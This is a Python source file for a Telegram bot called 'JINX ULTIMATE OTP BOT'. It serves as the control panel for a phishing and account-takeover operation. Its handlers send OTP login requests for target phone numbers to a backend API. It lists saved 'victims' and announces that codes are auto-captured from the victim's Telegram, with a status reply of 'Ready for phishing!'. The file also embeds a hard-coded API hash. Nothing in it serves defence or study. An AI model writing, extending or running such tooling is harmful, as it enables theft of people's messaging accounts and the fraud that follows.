from telethon import TelegramClient, events
import os
import asyncio
import requests
import logging

logger = logging.getLogger(__name__)

API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
RAILWAY_API_URL = os.environ.get("RAILWAY_API_URL")
CHAT_ID = os.environ.get("CHAT_ID")

bot = TelegramClient('bot_session', API_ID, API_HASH)

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.reply(
        "🤖 *JINX ULTIMATE OTP BOT* 😈\n\n"
        "Available commands:\n"
        "`/new_otp +62xxx` - Request new OTP\n"
        "`/victims` - List all victims\n"
        "`/get_otp +62xxx` - Get last OTP\n"
        "`/smart_login +62xxx` - Smart login\n"
        "`/status` - System status\n\n"
        "🚨 *Auto-OTP Capture: ACTIVE*",
        parse_mode='Markdown'
    )

@bot.on(events.NewMessage(pattern='/new_otp'))
async def handle_new_otp(event):
    try:
        if ' ' not in event.message.text:
            await event.reply("❌ Format: `/new_otp +628123456789`")
            return
            
        phone = event.message.text.split(' ', 1)[1].strip()
        
        if not phone.startswith('+'):
            await event.reply("❌ Phone must include country code: `+628123456789`")
            return
        
        await event.reply(f"🔄 Requesting new OTP for `{phone}`...")
        
        response = requests.post(f"{RAILWAY_API_URL}/get_new_otp", data={'phone': phone}, timeout=30)
        
        if response.status_code == 200 and response.json().get('success'):
            result = response.json()
            await event.reply(
                f"✅ *OTP REQUEST SUCCESS!* 😈\n\n"
                f"📱 *Phone:* `{phone}`\n"
                f"🔑 *Hash:* `{result['phone_code_hash']}`\n"
                f"⏰ *Timeout:* {result['timeout']}s\n\n"
                f"🚨 *OTP INTERCEPTOR ACTIVE!*\n"
                f"📨 OTP will auto-capture from victim's Telegram\n"
                f"💀 Wait for OTP notification!",
                parse_mode='Markdown'
            )
        else:
            error_msg = response.json().get('error', 'Unknown error')
            await event.reply(f"❌ *Failed:* `{error_msg}`", parse_mode='Markdown')
    
    except Exception as e:
        await event.reply(f"💀 *Error:* `{str(e)}`", parse_mode='Markdown')

@bot.on(events.NewMessage(pattern='/victims'))
async def list_victims_handler(event):
    try:
        response = requests.get(f"{RAILWAY_API_URL}/victims", timeout=10)
        
        if response.status_code == 200 and response.json().get('success'):
            victims = response.json().get('victims', [])
            
            if victims:
                victims_list = "\n".join([f"📱 `{v}`" for v in victims])
                await event.reply(
                    f"🎯 *SAVED VICTIMS:* 😈\n\n{victims_list}\n\n"
                    f"💀 Total: {len(victims)} victims",
                    parse_mode='Markdown'
                )
            else:
                await event.reply("❌ No victims saved yet!")
        else:
            await event.reply("❌ Failed to get victims list")
    
    except Exception as e:
        await event.reply(f"💀 *Error:* `{str(e)}`", parse_mode='Markdown')

@bot.on(events.NewMessage(pattern='/status'))
async def status_handler(event):
    await event.reply(
        "🤖 *JINX ULTIMATE STATUS* 😈\n\n"
        "✅ *Bot:* Online\n"
        "✅ *API:* Connected\n"
        "✅ *OTP Interceptor:* Active\n"
        "✅ *Auto-Capture:* Enabled\n\n"
        "💀 *Ready for phishing!*",
        parse_mode='Markdown'
    )

async def start_bot():
    """Start the bot"""
    try:
        await bot.start(bot_token=BOT_TOKEN)
        logger.info("🤖 JINX Bot started successfully!")
        await bot.run_until_disconnected()
    except Exception as e:
        logger.error(f"Bot start error: {e}")
        raise
